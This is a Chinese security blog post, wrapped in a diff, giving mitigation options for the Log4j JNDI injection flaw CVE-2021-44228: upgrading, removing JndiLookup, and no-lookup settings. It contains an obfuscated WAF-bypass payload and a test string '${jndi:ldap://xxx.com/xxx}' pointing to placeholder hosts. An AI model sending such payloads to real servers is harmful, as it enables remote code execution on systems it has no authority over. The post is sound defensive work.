@@ -1,0 +1,421 @@
+<!doctype html>
+<!--[if lt IE 7]><html class="no-js lt-ie9 lt-ie8 lt-ie7" lang="en"> <![endif]-->
+<!--[if (IE 7)&!(IEMobile)]><html class="no-js lt-ie9 lt-ie8" lang="en"><![endif]-->
+<!--[if (IE 8)&!(IEMobile)]><html class="no-js lt-ie9" lang="en"><![endif]-->
+<!--[if gt IE 8]><!--> <html class="no-js" lang="en"><!--<![endif]-->
+<head>
+<meta charset="utf-8">
+<title>Log4j 严重漏洞修复方案参考 &#8211; KINGX</title>
+<meta name="description" content="CVE-2021-44228">
+<meta name="keywords" content="0day, log4j, defense">
+
+<!-- Twitter Cards -->
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://kingx.me/images/">
+<meta name="twitter:title" content="Log4j 严重漏洞修复方案参考">
+<meta name="twitter:description" content="CVE-2021-44228">
+<meta name="twitter:creator" content="@https://twitter.com/KINGX_CN">
+
+<!-- Open Graph -->
+<meta property="og:locale" content="en_US">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Log4j 严重漏洞修复方案参考">
+<meta property="og:description" content="CVE-2021-44228">
+<meta property="og:url" content="https://kingx.me/Patch-log4j.html">
+<meta property="og:site_name" content="KINGX">
+
+
+
+
+
+<link rel="canonical" href="https://kingx.me/Patch-log4j.html">
+<link href="https://kingx.me/feed.xml" type="application/atom+xml" rel="alternate" title="KINGX Feed">
+
+<!-- http://t.co/dKP3o1e -->
+<meta name="HandheldFriendly" content="True">
+<meta name="MobileOptimized" content="320">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<!-- For all browsers -->
+<link rel="stylesheet" href="https://kingx.me/assets/css/main.css">
+<!-- Webfonts -->
+<link href="//fonts.googleapis.com/css?family=Lato:300,400,700,300italic,400italic" rel="stylesheet" type="text/css">
+
+<meta http-equiv="cleartype" content="on">
+
+<!-- Load Modernizr -->
+<script src="https://kingx.me/assets/js/vendor/modernizr-2.6.2.custom.min.js"></script>
+
+<!-- Icons -->
+<!-- 16x16 -->
+<link rel="shortcut icon" href="https://kingx.me/favicon.ico">
+<!-- 32x32 -->
+<link rel="shortcut icon" href="https://kingx.me/favicon.png">
+<!-- 57x57 (precomposed) for iPhone 3GS, pre-2011 iPod Touch and older Android devices -->
+<link rel="apple-touch-icon-precomposed" href="https://kingx.me/images/apple-touch-icon-precomposed.png">
+<!-- 72x72 (precomposed) for 1st generation iPad, iPad 2 and iPad mini -->
+<link rel="apple-touch-icon-precomposed" sizes="72x72" href="https://kingx.me/images/apple-touch-icon-72x72-precomposed.png">
+<!-- 114x114 (precomposed) for iPhone 4, 4S, 5 and post-2011 iPod Touch -->
+<link rel="apple-touch-icon-precomposed" sizes="114x114" href="https://kingx.me/images/apple-touch-icon-114x114-precomposed.png">
+<!-- 144x144 (precomposed) for iPad 3rd and 4th generation -->
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="https://kingx.me/images/apple-touch-icon-144x144-precomposed.png">
+
+
+
+
+<style type="text/css">body {background-image:url(https://kingx.me/images/triangular.png);}</style>
+
+
+</head>
+
+<body id="post" >
+
+<!--[if lt IE 9]><div class="upgrade"><strong><a href="http://whatbrowser.org/">Your browser is quite old!</strong> Why not upgrade to a different browser to better enjoy this site?</a></div><![endif]-->
+<nav id="dl-menu" class="dl-menuwrapper" role="navigation">
+	<button class="dl-trigger">Open Menu</button>
+	<ul class="dl-menu">
+		<li><a href="https://kingx.me/">Home</a></li>
+		<li>
+			<a href="#">About</a>
+			<ul class="dl-submenu">
+				<li>
+					<img src="https://kingx.me/images/avatar.jpg" alt="KINGX photo" class="author-photo">
+					<h4>KINGX</h4>
+					<p>What is Security</p>
+				</li>
+				<li><a href="https://kingx.me/about/"><span class="btn btn-inverse">Learn More</span></a></li>
+				<li>
+					<a href="mailto:root#kingx.me"><i class="fa fa-fw fa-envelope"></i> Email</a>
+				</li>
+				<li>
+					<a href="https://twitter.com/KINGX_CN"><i class="fa fa-fw fa-twitter"></i> Twitter</a>
+				</li>
+				<li>
+					<a href="https://weibo.com/u/1624430122"><i class="fa fa-fw fa-weibo"></i> Weibo</a>
+				</li>
+				
+				
+				
+				<li>
+					<a href="https://github.com/KINGX-Code"><i class="fa fa-fw fa-github"></i> GitHub</a>
+				</li>
+				
+				
+				
+				
+			</ul><!-- /.dl-submenu -->
+		</li>
+		<!-- <li>
+			<a href="#">Posts</a>
+			<ul class="dl-submenu">
+				<li><a href="https://kingx.me/posts/">All Posts</a></li>
+				<li><a href="https://kingx.me/tags/">All Tags</a></li>
+			</ul>
+		</li> -->
+		
+	    
+	    <li><a href="https://kingx.me/latest-events/" >Security Incidents</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/latest-vulns/" >Vulnerabilities</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/pentest-tools/" >Red Team</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/cheatsheet/" >CheatSheet</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/stop-learning/" >Stop Learning</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/posts/" >Archives</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/tags/" >Tags</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/links/" >Links</a></li>
+	  
+	    
+	    <li><a href="https://kingx.me/feed.xml" >RSS</a></li>
+	  
+	</ul><!-- /.dl-menu -->
+</nav><!-- /.dl-menuwrapper -->
+
+
+
+
+<div id="main" role="main">
+  <article class="hentry">
+    <header class="header-title">
+      <div class="header-title-wrap">
+        
+          <h1 class="entry-title"><a href="https://kingx.me/Patch-log4j.html" rel="bookmark" title="Log4j 严重漏洞修复方案参考">Log4j 严重漏洞修复方案参考</a></h1>
+        
+        <h2><span class="entry-date date published"><time datetime="2021-12-12T00:00:00-05:00">December 12, 2021, KINGX</time></span></h2>
+        
+        <p class="entry-reading-time">
+          <i class="fa fa-clock-o"></i>
+          
+Reading time ~1 minute
+          
+          <span id="busuanzi_container_page_pv">
+             / Page View <span id="busuanzi_value_page_pv">0</span> / Site Visitor <span id="busuanzi_value_site_uv">0</span>
+          </span>
+          
+        </p><!-- /.entry-reading-time -->
+        
+
+      </div><!-- /.header-title-wrap -->
+    </header>
+    <div class="entry-content">
+      <span class="entry-tags" style="color:red;font-size:13px;margin-bottom: 0px;">「声明：本博客中涉及到的相关漏洞均为官方已经公开并修复的漏洞，涉及到的安全技术也仅用于企业安全建设和安全对抗研究。本文仅限业内技术研究与讨论，严禁用于非法用途，否则产生的一切后果自行承担。」</span>
+      <p>CVE-2021-44228，原理上是 log4j-core 代码中的 JNDI 注入漏洞。这个漏洞可以直接导致服务器被入侵，而且由于“日志”场景的特性，攻击数据可以多层传导，甚至可以威胁到纯内网的服务器。log4j 作为 Java 开发的基础公共日志类，使用范围非常广，漏洞必定影响深远，想想当年commons-collections反序列化漏洞的影响范围。</p>
+
+<p>Github漏洞公告：https://github.com/advisories/GHSA-jfh8-c2jp-5v3q</p>
+
+<p>影响 &lt; 2.15.0 的所有 2.x 版本。也就是说，除了最新版本之外的所有版本都受影响。</p>
+
+<p><strong>最直接、有效、稳定的修复方式是：将 log4j-core 升级到 2.15.0 版本</strong></p>
+
+<p><strong>最直接、有效、稳定的修复方式是：将 log4j-core 升级到 2.15.0 版本</strong></p>
+
+<p><strong>最直接、有效、稳定的修复方式是：将 log4j-core 升级到 2.15.0 版本</strong></p>
+
+<p>如果实在无法升级，可以尝试把漏洞类删掉。其他修复方式可以结合使用起到比较好的快速缓解作用，但受限于不同的环境，可能会产生各种各样比较麻烦的问题或者未来的隐患。长期修复方案需要保证稳定、可靠、持久有效，这种严重漏洞值得一个发布和重启。</p>
+
+<p>2.15.0 版本下载地址：https://repo.maven.apache.org/maven2/org/apache/logging/log4j/log4j-core/2.15.0/</p>
+
+<p>pom.xml 配置</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;dependency&gt;</span>
+    <span class="nt">&lt;groupId&gt;</span>org.apache.logging.log4j<span class="nt">&lt;/groupId&gt;</span>
+    <span class="nt">&lt;artifactId&gt;</span>log4j-core<span class="nt">&lt;/artifactId&gt;</span>
+    <span class="nt">&lt;version&gt;</span>2.15.0<span class="nt">&lt;/version&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>
+</code></pre></div></div>
+
+<h3 id="缓解方式1接入安全产品">缓解方式1：接入安全产品</h3>
+
+<p>第一时间上WAF规则、RASP拦截等措施，给修复争取时间。</p>
+
+<p>但是也要注意一些静态规则上的绕过，log4j 支持的写法比较多，有非常多绕过姿势。比如：</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code>${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://xxxxxxx.xx/poc}
+</code></pre></div></div>
+
+<h3 id="缓解方式2删除漏洞类">缓解方式2：删除漏洞类</h3>
+
+<p>通过删除漏洞类进行修复的方案比较稳，也是官方推荐的一种修复方案。直接删除 log4j jar 包中存在漏洞的类：</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip <span class="nt">-q</span> <span class="nt">-d</span> log4j-core-<span class="k">*</span>.jar org/apache/logging/log4j/core/lookup/JndiLookup.class
+</code></pre></div></div>
+
+<p>这种修复比较方便快捷，一般业务代码也不会用到 jndi lookup 这个功能。不过可能会对基于版本号判定的安全数据采集造成一定困扰，无法准确统计漏洞的最新受影响情况。建议删除之后在 jar 包后面加上一定的标记，如： log4j-2.14.1.sec.jar</p>
+
+<p>另外，由于某些原因不想删除的话，可以自己代码替换原始的 JndiLookup 类，将它加到业务代码中。需要注意的是，必须保证它在 log4j 原类之前加载。</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">package</span> <span class="n">org</span><span class="o">.</span><span class="na">apache</span><span class="o">.</span><span class="na">logging</span><span class="o">.</span><span class="na">log4j</span><span class="o">.</span><span class="na">core</span><span class="o">.</span><span class="na">lookup</span><span class="o">;</span>
+
+<span class="kd">public</span> <span class="kd">class</span> <span class="nc">JndiLookup</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="nf">JndiLookup</span><span class="o">()</span> <span class="o">{</span>
+        <span class="k">throw</span> <span class="k">new</span> <span class="nf">NoClassDefFoundError</span><span class="o">(</span><span class="s">"JNDI lookup is disabled"</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<p>也可以做成依赖包，在 log4j-core 之前添加，可以实现同样的效果（注意不要引入不可信的第三方依赖，可能导致潜在安全风险，以下配置来源互联网，仅作为示例，请勿直接使用）：</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nt">&lt;dependency&gt;</span>
+    <span class="nt">&lt;groupId&gt;</span>org.glavo<span class="nt">&lt;/groupId&gt;</span>
+    <span class="nt">&lt;artifactId&gt;</span>log4j-patch<span class="nt">&lt;/artifactId&gt;</span>
+    <span class="nt">&lt;version&gt;</span>1.0<span class="nt">&lt;/version&gt;</span>
+<span class="nt">&lt;/dependency&gt;</span>  
+</code></pre></div></div>
+
+<p>当然也可以通过RASP的方式干掉漏洞类，Github上有不少RASP的无损修复方案，比如：</p>
+
+<p>https://github.com/chaitin/log4j2-vaccine</p>
+
+<p>https://github.com/boundaryx/cloudrasp-log4j2</p>
+
+<h3 id="缓解方式3通过配置禁用-log4j-的-lookup-功能">缓解方式3：通过配置禁用 log4j 的 lookup 功能</h3>
+
+<p>禁用的方式就比较多了。<strong>然而下面2、3、4这几种方式对低于 2.10 版本的 log4j-core 都没有效果</strong>，而且环境变量和启动参数这种设置，在迁移或者变更的过程中丢失的可能性比较大。log4j 在 2.15.0 版本中默认就已经关闭了 lookup 功能。</p>
+
+<p>log4j2.component.properties、log4j2.xml 默认放在 ClassPath 路径下，如：源代码的资源目录或者可执行程序所在的当前目录。</p>
+
+<h4 id="1-设置日志输出-pattern-格式">1. 设置日志输出 Pattern 格式</h4>
+
+<p>对于 &gt;=2.7 的版本，在 log4j 中对每一个日志输出格式进行修改。在 %msg 占位符后面添加 {nolookups}，这种方式的适用范围比其他三种配置更广。比如在 log4j2.xml 中配置：</p>
+
+<div class="language-xml highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span>
+<span class="nt">&lt;Configuration</span> <span class="na">status=</span><span class="s">"WARN"</span><span class="nt">&gt;</span>
+    <span class="nt">&lt;Appenders&gt;</span>
+        <span class="nt">&lt;Console</span> <span class="na">name=</span><span class="s">"Console"</span> <span class="na">target=</span><span class="s">"SYSTEM_OUT"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;PatternLayout</span> <span class="na">pattern=</span><span class="s">"%d{HH:mm:ss.SSS} [%t] %-5level %logger{36} - %msg{nolookups}%n"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;/Console&gt;</span>
+    <span class="nt">&lt;/Appenders&gt;</span>
+    <span class="nt">&lt;Loggers&gt;</span>
+        <span class="nt">&lt;Root</span> <span class="na">level=</span><span class="s">"error"</span><span class="nt">&gt;</span>
+            <span class="nt">&lt;AppenderRef</span> <span class="na">ref=</span><span class="s">"Console"</span><span class="nt">/&gt;</span>
+        <span class="nt">&lt;/Root&gt;</span>
+    <span class="nt">&lt;/Loggers&gt;</span>
+<span class="nt">&lt;/Configuration&gt;</span>
+</code></pre></div></div>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">public</span> <span class="kd">class</span> <span class="nc">Test</span> <span class="o">{</span>
+    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="n">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="o">{</span>
+    <span class="n">String</span> <span class="n">t</span> <span class="o">=</span> <span class="s">"${jndi:ldap://xxx.com/xxx}"</span><span class="o">;</span>
+    <span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="n">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="n">LogManager</span><span class="o">.</span><span class="na">ROOT_LOGGER_NAME</span><span class="o">);</span>
+    <span class="n">logger</span><span class="o">.</span><span class="na">error</span><span class="o">(</span><span class="n">t</span><span class="o">);</span>
+    <span class="o">}</span>
+<span class="o">}</span>
+</code></pre></div></div>
+
+<h4 id="2-设置jvm系统属性">2. 设置JVM系统属性</h4>
+
+<p>在 Java 应用启动参数中增加 -Dlog4j2.formatMsgNoLookups=true，或者在业务代码中设置系统属性：</p>
+
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">// 必须在 log4j 实例化之前设置该系统属性</span>
+<span class="n">System</span><span class="o">.</span><span class="na">setProperty</span><span class="o">(</span><span class="s">"log4j2.formatMsgNoLookups"</span><span class="o">,</span> <span class="s">"true"</span><span class="o">);</span>
+
+<span class="n">Logger</span> <span class="n">logger</span> <span class="o">=</span> <span class="n">LogManager</span><span class="o">.</span><span class="na">getLogger</span><span class="o">(</span><span class="n">LogManager</span><span class="o">.</span><span class="na">ROOT_LOGGER_NAME</span><span class="o">);</span>
+</code></pre></div></div>
+
+<h4 id="3-修改配置文件">3. 修改配置文件</h4>
+
+<p>在配置文件 log4j2.component.properties 中增加：log4j2.formatMsgNoLookups=true，配置文件放置于应用程序的 ClassPath 路径下。</p>
+
+<h4 id="4-设置进程环境变量">4. 设置进程环境变量</h4>
+
+<p>在环境变量中增加：LOG4J_FORMAT_MSG_NO_LOOKUPS=true</p>
+
+<blockquote>
+  <p>注意！这些配置和属性，并不能在所有场景下生效，比如在 logstash 中就无法生效：
+<strong>Solutions and Mitigations:</strong>
+The widespread flag -Dlog4j2.formatMsgNoLookups=true does NOT mitigate the vulnerability in Logstash, as Logstash uses Log4j in a way where the flag has no effect. It is therefore necessary to remove the JndiLookup class from the log4j2 core jar, with the following command:</p>
+
+  <p>zip -q -d <LOGSTASH_HOME>/logstash-core/lib/jars/log4j-core-2.* org/apache/logging/log4j/core/lookup/JndiLookup.class</LOGSTASH_HOME></p>
+
+  <p>Refer: https://discuss.elastic.co/t/apache-log4j2-remote-code-execution-rce-vulnerability-cve-2021-44228-esa-2021-31/291476</p>
+</blockquote>
+
+<h3 id="缓解方式4升级jdk版本">缓解方式4：升级JDK版本</h3>
+
+<p>对于Oracle JDK 11.0.1、8u191、7u201、6u211或者更高版本的JDK来说，默认就已经禁用了 RMI Reference、LDAP Reference 的远程加载。对于 RCE 来说，可以起到很直接的缓解作用，可以作为增强型的加固方案。</p>
+
+<p>在高版本JDK环境下，JNDI注入也还是存在一定RCE风险，可以参考这篇文章：<a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</a></p>
+
+<p>另外 log4j 漏洞本身除了 RCE，还存在着巨大的攻击面，比如 SSRF、敏感信息泄露等等，威胁非常大，不要企图仅仅通过升级JDK版本来修复漏洞，建议还是老老实实升级。</p>
+
+      <footer class="entry-meta">
+        <span class="entry-tags" style="color:black;font-size:13px;margin-bottom: 0px;">欢迎订阅我的微信公众号</span>
+        <img src="/images/secengine.jpg" alt="welcome subscribe"/>
+        <span class="entry-tags"><a href="https://kingx.me/tags/#0day" title="Pages tagged 0day" class="tag"><span class="term">0day</span></a><a href="https://kingx.me/tags/#log4j" title="Pages tagged log4j" class="tag"><span class="term">log4j</span></a><a href="https://kingx.me/tags/#defense" title="Pages tagged defense" class="tag"><span class="term">defense</span></a></span>
+        
+        <div class="social-share">
+  <ul class="socialcount socialcount-small inline-list">
+    <li class="weibo"><a href="http://service.weibo.com/share/share.php?title=分享KINGX的文章《Log4j 严重漏洞修复方案参考》&url=https://kingx.me/Patch-log4j.html&source=bookmark" title="Share on Weibo" target="_blank"><span class="count"><i class="fa fa-weibo"></i> WEIBO</span></a></li>
+    <li class="facebook"><a href="https://www.facebook.com/sharer/sharer.php?u=https://kingx.me/Patch-log4j.html" title="Share on Facebook"><span class="count"><i class="fa fa-facebook-square"></i> Like</span></a></li>
+    <li class="twitter"><a href="https://twitter.com/intent/tweet?text=https://kingx.me/Patch-log4j.html" title="Share on Twitter"><span class="count"><i class="fa fa-twitter-square"></i> Tweet</span></a></li>
+    <li class="googleplus"><a href="https://plus.google.com/share?url=https://kingx.me/Patch-log4j.html" title="Share on Google Plus"><span class="count"><i class="fa fa-google-plus-square"></i> +1</span></a></li>
+  </ul>
+</div><!-- /.social-share -->
+<!--
+<div class="ds-share" data-thread-key="/Patch-log4j" data-title="Log4j 严重漏洞修复方案参考" data-images="" data-content="Log4j 严重漏洞修复方案参考" data-url="https://kingx.me/Patch-log4j.html">
+    <div class="ds-share-inline">
+      <ul  class="ds-share-icons-16">
+        <li data-toggle="ds-share-icons-more"><a class="ds-more" href="javascript:void(0);">分享到：</a></li>
+        <li><a class="ds-weibo" href="javascript:void(0);" data-service="weibo">微博</a></li>
+        <li><a class="ds-qzone" href="javascript:void(0);" data-service="qzone">QQ空间</a></li>
+        <li><a class="ds-qqt" href="javascript:void(0);" data-service="qqt">腾讯微博</a></li>
+        <li><a class="ds-wechat" href="javascript:void(0);" data-service="wechat">微信</a></li>
+      </ul>
+      <div class="ds-share-icons-more">
+      </div>
+    </div>
+</div>
+-->
+      </footer>
+    </div><!-- /.entry-content -->
+    
+    
+
+    <div class="read-more">
+  
+    <div class="read-more-header">
+      
+        <a href="https://kingx.me/Thinking-about-the-RedTeam-Engagement.html" class="read-more-btn">Read More</a>
+      
+    </div><!-- /.read-more-header -->
+    <div class="read-more-content">
+      
+      <h3><a href="https://kingx.me/Thinking-about-the-RedTeam-Engagement.html" title="浅谈大规模红蓝对抗攻与防">浅谈大规模红蓝对抗攻与防</a></h3>
+      <p>Thinking about the Offensive and Defense of RedTeam Engagement <a href="https://kingx.me/Thinking-about-the-RedTeam-Engagement.html">Continue reading</a></p>
+      
+    </div><!-- /.read-more-content -->
+  
+  <div class="read-more-list">
+    
+      
+      <div class="list-item">
+        <h4><a href="https://kingx.me/Exploit-FastJson-Without-Reverse-Connect.html" title="Java动态类加载，当FastJson遇到内网">Java动态类加载，当FastJson遇到内网</a></h4>
+        <span>Published on December 31, 2019</span>
+      </div><!-- /.list-item -->
+      
+    
+      
+      <div class="list-item">
+        <h4><a href="https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html" title="如何绕过高版本JDK的限制进行JNDI注入利用">如何绕过高版本JDK的限制进行JNDI注入利用</a></h4>
+        <span>Published on June 03, 2019</span>
+      </div><!-- /.list-item -->
+      
+    
+  </div><!-- /.read-more-list -->
+</div><!-- /.read-more -->
+  </article>
+</div><!-- /#main -->
+
+<div class="footer-wrapper">
+  <footer role="contentinfo">
+    <span>&copy; 2021 KINGX. Powered by Jekyll using the HPSTR Theme.</span>
+  </footer>
+</div><!-- /.footer-wrapper -->
+
+<!--<script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>-->
+<!-- <script src="http://libs.baidu.com/jquery/1.9.1/jquery.min.js"></script> -->
+<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+<script>window.jQuery || document.write('<script src="https://kingx.me/assets/js/vendor/jquery-1.9.1.min.js"><\/script>')</script>
+<script src="https://kingx.me/assets/js/scripts.min.js"></script>
+
+
+
+
+<script>
+
+var _hmt = _hmt || [];
+(function() {
+  var hm = document.createElement("script");
+  if(location.host=="kingx.me"){
+    hm.src = "https://hm.baidu.com/hm.js?d11d8512e0bc6992b9c9bbf2d266ce31";
+  }else if(location.host=="kingx.sinaapp.com"){
+    hm.src = "https://hm.baidu.com/hm.js?d1b3dbd97b73868454f102755fdf51ba";
+  }
+  var s = document.getElementsByTagName("script")[0]; 
+  s.parentNode.insertBefore(hm, s);
+})();
+</script>
+
+
+
+<!-- Busuanzi Analytics -->
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+	        
+
+</body>
+</html>
